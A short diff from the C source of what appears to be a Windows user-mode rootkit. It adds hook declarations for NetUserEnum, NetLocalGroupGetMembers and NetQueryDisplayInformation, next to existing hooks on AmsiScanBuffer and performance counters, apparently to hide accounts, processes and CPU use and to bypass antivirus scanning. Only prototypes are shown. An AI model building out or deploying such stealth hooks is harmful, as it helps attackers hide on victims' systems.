@@ -41,6 +41,9 @@ static NTSTATUS NTAPI HookedSamQueryDisplayInformation(HANDLE domainHandle, NT_D
 static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_RAW_COUNTER_ITEM_W itemBuffer);
 static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_FMT_COUNTERVALUE_ITEM_W itemBuffer);
 static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, ULONG length, LPCWSTR contentName, LPVOID amsiSession, LPDWORD result);
+static DWORD WINAPI HookedNetUserEnum(LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD resume_handle);
+static DWORD WINAPI HookedNetLocalGroupGetMembers(LPCWSTR servername, LPCWSTR localgroupname, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD_PTR resume_handle);
+static DWORD WINAPI HookedNetQueryDisplayInformation(LPCWSTR servername, DWORD level, DWORD index, DWORD entriesrequested, DWORD preferredmaximumlength, LPDWORD returnedentrycount, LPVOID *sortedBuffer);
 
 static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter);
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime);
